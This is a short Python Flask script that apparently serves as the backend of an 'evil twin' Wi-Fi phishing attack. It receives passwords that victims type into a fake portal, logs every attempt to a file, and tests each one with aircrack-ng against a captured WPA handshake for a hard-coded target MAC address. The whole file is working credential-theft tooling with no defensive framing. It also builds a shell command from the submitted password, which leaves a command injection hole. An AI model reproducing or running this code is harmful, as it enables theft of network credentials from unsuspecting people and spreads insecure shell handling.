from flask import Flask, request,jsonify, json, make_response
from subprocess import run, PIPE
import time,os

target = '5C:F9:6A:FC:17:2A'

if len(target) != 17:
   print('[ERROR] wrong target mac address should be 17 character')
   exit(1)
if not 'evil.cap' in os.listdir():
   print(f'[ERROR] evil.cap not found copy your target handshake in current folder {os.getcwd()} and name it evil.cap')
   exit(1)

app = Flask('xd-evil')
logpass = open('attempts.txt','a')
print('Any Attemps will be saved HERE\n\n\n', file=logpass)
print('[INFO] Any Attemps will be saved in attempts.txt')

def checkWPA(passw):
    wrdl = open('password.txt','w')
    print(passw, file=wrdl)
    wrdl.close()
    cmd = f"aircrack-ng evil.cap -b '{target}' -w password.txt"
    out = run(cmd,stdout=PIPE,shell=True)
    output = out.stdout
    code = out.returncode
    print(output,code)
    if "KEY NOT FOUND" in str(output):
       return False
    elif "KEY FOUND" in str(output):
       return True
    elif "ERROR" in str(output): return False
    else: return None

@app.before_request
def log_request():
    app.logger.debug("Request Headers %s", request.headers)
    return None

@app.route("/pass", methods=['POST'])
def hello_world():
    passw = request.form["pass"]
    print(passw)
    print(passw, file=logpass)
    results = checkWPA(passw)
    logpass.flush()
    if results:
       response = jsonify(status="All good")
       response.headers.add("Access-Control-Allow-Origin", "*")
       return response

    else:
       response = jsonify(status="notgood")
       response.headers.add("Access-Control-Allow-Origin", "*")
#       print(response)
       return response


@app.after_request
def after(response):
    # todo with response
    print(response.status)
#    print(response.headers)
    print(response.get_data())
    return response

app.run(host="0.0.0.0")
